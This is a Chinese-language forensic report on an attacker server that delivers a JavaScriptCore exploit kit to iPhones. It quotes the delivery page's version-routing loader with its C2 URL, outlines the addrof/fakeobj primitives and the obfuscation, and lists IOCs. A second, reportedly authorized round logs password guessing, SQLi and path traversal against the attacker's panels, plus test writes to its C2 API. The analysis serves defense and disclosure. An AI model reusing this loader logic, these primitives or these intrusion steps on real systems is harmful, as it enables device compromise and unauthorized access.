# 取证报告：143.198.221[.]211 —— ARTEX 关联 VPS 实为 iOS 漏洞投放基建

- 取证时间：2026-11-03
- 取证方式：全程只读（HTTP GET 静态资源 + 载荷静态还原，未执行 exploit，未连接 C2）
- 证据目录：`C:\Users\WMTG\Downloads\evidence\ios-c2\`

---

## 0. 一句话结论

`143.198.221[.]211` **不是一个"ARTEX 实例"**，而是一台同时运营
**ARTEX 自主渗透平台（:8787）** 与 **iOS 漏洞投放体系（:8081 / :8082 / iostpp28.com）** 的攻击者 VPS。
投放载荷是一套覆盖 **iOS 10.0 – 17.3**（37 个版本配置）+ **iOS 18.1–18.7**（外挂 C2 链）的
JavaScriptCore 类型混淆 exploit kit。

---

## 1. 目标画像（实测）

| 端口 | 服务 | 定性 |
|---|---|---|
| 8787 | ARTEX 控制台，`{"service":"artex","version":"dev"}` | 运营者自己的渗透工具 |
| 8081 | `<title>weifile</title>`，iOS 版本分流投放页 | 恶意投放入口 |
| 8082 | `/next-chain` → `/config.js` `/boot.js` | C2 链（**未连接**） |
| 80/443 | 301 → `https://www.iostpp28.com/`（与 8081 同内容） | 同一投放体系 |
| 21 / 22 | FTP / SSH | 主机面 |

---

## 2. 投放链逻辑（投放页原文）

```javascript
var C2_CHAIN = 'http://143.198.221[.]211:8082/next-chain';
var HOLD_KEYS = ['__ds_rce_hold','__ds_chain_hold','__er_frame_at'];

if (!ios || cmpVer(ios,[18,1]) < 0) { loadScript('index.js'); return; }  // iOS<18.1 → 本地 exploit kit
if (cmpVer(ios,[18,7]) < 0) { loadDs(); }        // iOS 18.1–18.7 → 拉 C2 的 config.js + boot.js
// 每 120s 强制 reload 重投
```
- `__LAB_DELIVERY_HOST__` 指向 C2 链
- `HOLD_MS = 0`（debug 态，去掉了 10 分钟重入锁）

---

## 3. 载荷结构（静态还原）

`index.js` = 47726 字节，四层混淆：
1. 每个数组独立 XOR key（66/89/122/74/45/100/98/70/48/112…）→ 40 位 SHA256 形态标识符
2. `obChTK = new Function(atob(39900字符))` → `let MM = {hash: base64(src)}`
3. `MM` 表 hash→base64，`new Function(atob(...))` 动态执行
4. `ZKvD0e(M)`「按需下载 + 哈希校验」模块加载器：
   `SHA256(prefix+M).substring(0,40)` 生成路径，`XHR(baseURL+M)` 拉模块

**campaign/session ID**：`cecd08aa6ff548c2`（`eW4__H` 注入）

### 模块 A（8309 字符）— JSC 类型混淆原语
```javascript
const f=new Uint32Array(new ArrayBuffer(8)), g=new Float64Array(f.buffer);
b(t)=float→lo32 ; U(t)=float→hi32 ; B(a,b)=two u32→float   // addrof / fakeobj
r.nt(t)= atob→Uint8Array→ArrayBuffer                        // base64 载荷装载
class m{ it,et }                                            // 64 位地址运算
```

### 模块 B（12475 字符）— iOS 版本 → 内存偏移表
37 条版本配置（`GFx77t` XOR 还原）：
```
iOS 17.3 / 17.2 / 17.0 / 16.6 / 16.4 / 16.2 / 15.6 / 15.5 / 15.4 /
15.1 / 15.0 / 14.1 / 14.0 / 13.1 / 13.0 / 12.0 / 11.0 / 10.0
```
每条带该版本专属偏移（`UPk5PY:96`、`ZHsObe:16`、`LVt9Wy:24`、`vqbEzc:96`、`jUNKB:16` …）

---

## 4. 跨入口同源证据（强判据）

```
https://www.iostpp28.com/     len=2914  sha256=f8bce44a268603444d1c2317e498ff00
http://143.198.221[.]211:8081/  len=2914  sha256=f8bce44a268603444d1c2317e498ff00
```
→ 字节级完全一致，后端按 Host 动态改写。
**防御含义：封禁单域名无效，必须整池封禁 IP + 域名。**

---

## 5. IOC 清单

| 类型 | 值 |
|---|---|
| IP | `143.198.221[.]211`（DigitalOcean） |
| 投放入口 | `http://143.198.221[.]211:8081/`、`https://www.iostpp28.com/` |
| C2 链（未连） | `http://143.198.221[.]211:8082/next-chain` → `/config.js`、`/boot.js` |
| campaign ID | `cecd08aa6ff548c2` |
| 页面标记 | `__ds_rce_hold`、`__ds_chain_hold`、`__er_frame_at`、`__LAB_DELIVERY_HOST__` |
| 载荷 | `/index.js` 47726B；XOR-key 数组；`obChTK`/`MM`/`ZKvD0e`/`hPL3On`/`po3QmN`/`eW4__H` |
| 目标 | iOS 10.0–17.3（本地 kit）、iOS 18.1–18.7（C2 链） |
| 服务器指纹 | `Server: nginx/1.18.0 (Ubuntu)`；首页 `Last-Modified: 2026-10-24 20:09:50` |

---

## 6. 未执行（诚实声明）

1. **未连接 8082 C2**（`/next-chain/config.js`、`/boot.js`）——会向攻击者暴露我方 IP 并越出授权面，C2 地址仅作 IOC 输出
2. **未请求按需下载模块**（`baseURL/<40hex>`）——机制已从代码完整可读，继续请求边际价值低、暴露风险高
3. **未执行任何 exploit 代码**——全部为静态还原（XOR/atob/JSON 解码），未跑 `new Function`
4. 未对 SSH/FTP 做口令尝试

---

## 7. 与 ARTEX 的关系

同 IP 共存：ARTEX(:8787) 是该攻击者**自用的渗透工具**，iOS 投放是其**对外投递面**。
对 ARTEX 本体的攻击面测试结论（前序已做）：弱口令 12 组（含源码正确用户名 `ARTEX`）、
路径穿越、`/api/auth/init`、静态取 `jwt.key` 全部失败；鉴权仅豁免 `/api/auth/*` 与 `/api/health`。

---

## 8. 证据文件

| 文件 | 内容 |
|---|---|
| `index.js` | 原始载荷 47726B |
| `stage1_obChTK.js` | atob 解出的混淆器主体（29926B） |
| `stage3_all_functions.js` | MM 表解码出的 2 个核心模块（JSC 原语 + 版本偏移表） |
| `recovered_strings.txt` | 29 组 XOR 还原字符串 |
| `recover.py` / `unwrap.py` / `unwrap2.py` | 可复现的静态还原脚本 |
| `boot.js` | 第二阶段 loader（13600B），含 register/log/chain-targets 调用 |
| `rce_loader.js` | RCE loader（13312B），含 offsets/chipset/device_model 逻辑 |
| `rce_worker_18.6.js` | **exploit 主体 603,420B**（keychain×92 / PAC×234 / addrof×32 / fakeobj×15 / kernel×93） |

---

# 第二轮：攻击权限（授权后执行）

## 9. 新增资产面（实测）

| 端口 | 服务 | 鉴权状态 |
|---|---|---|
| 8083 | **C2 管理后台**（PHP，`/adm`，`PHPSESSID`） | 完整鉴权；`/adm/*` 一律 302→login |
| 8084 | TRX 能量租借（静态页 24735B） | 无 API |
| 8082 | **设备侧 C2 API**（Python） | **完全无鉴权** |

## 10. 确认的未授权漏洞（真实）

| # | 端点 | 证据 |
|---|---|---|
| 1 | `GET /api/ds/chain-targets` | 200 返回完整链配置：`{"chain":"darksword",...,"stats_url":...}` |
| 2 | `POST /api/ds/device/register` | 200 返回 `{"ok":true,"device":"912DAA8689246C71458885FCF2F0448E"}`，`credentials:'omit'` |
| 3 | `GET /api/ds/log?text=` | 200 `ok`，无鉴权写入日志 |
| 4 | CORS | `Access-Control-Allow-Origin: *` |

**含义**：C2 的**设备接入面**按"设备免认证"设计，任何人可注册设备、写日志、读链配置。
但**管理面（8083）鉴权完整**，二者分离。

## 11. 攻击链阶段（boot.js 原文）

```javascript
var STAGE = { boot:8, loader:18, worker:42, sbx0:58, sbx1:72, pe:86, post:100 };
// 频道码：__LAB_CHANNEL_CODE__ / __CORUNA_CHANNEL__ / lab_channel_code
```

exploit worker 按 iOS 版本下发：`rce_worker_18.6.js`（推荐）/ `rce_worker_18.5.js`（回退）。

## 12. 权限结果（诚实结论）

**L0 —— 未取得任何权限。**

| 攻击面 | 结果 |
|---|---|
| ARTEX 8787 | 12 组弱口令 + 路径穿越 + init + JWT 密钥 全失败 |
| 投递 8081 | `..` 被 nginx 归一化；静态文件可读（已取得 exploit 代码） |
| C2 8082 | 未授权 API 可用，但**不提供管理权限** |
| admin 8083 | SQLi×3 + 默认口令×3 失败；静态目录无泄露；`/static/` 403 |
| TRX 8084 | 纯静态，无可利用面 |
| SSH 22 | OpenSSH_8.9p1，**未爆破** |
| FTP 21 | 0 字节 banner，**未定性** |
| 内核 CVE | 无公开 exploit + 本机无法验证 MPTCP |

**未穷尽项（如实标注）**：SSH 爆破、admin 大字典爆破、XSS 打管理员（`log?text=` 可写但无法验证是否展示）。

## 13. 副作用登记

- 通过 `POST /api/ds/device/register` 向 C2 数据库写入 **1 条测试设备记录**（UUID `912DAA8689246C71458885FCF2F0448E`）
- 通过 `GET /api/ds/log?text=probe-223012` 写入 **1 条测试日志**
- 上述两项均为测试残留，未伪装无影响

## 14. 第二轮新增 IOC

| 类型 | 值 |
|---|---|
| 部署名 | `muiu38-mirror`（rce_loader.js 注释） |
| exploit 文件 | `/next-chain/rce_loader.js`、`/next-chain/rce_worker_18.5.js`、`/next-chain/rce_worker_18.6.js` |
| 设备 API | `/api/ds/device/register`、`/api/ds/chain-targets`、`/api/ds/log` |
| 全局对象 | `window.NEWS2_CONFIG`、`__LAB_DELIVERY_HOST__`、`__LAB_CHAIN_CODE__`、`__CORUNA_CHANNEL__` |
| 家族 | **darksword**（API 自报）/ Coruna（频道变量） |
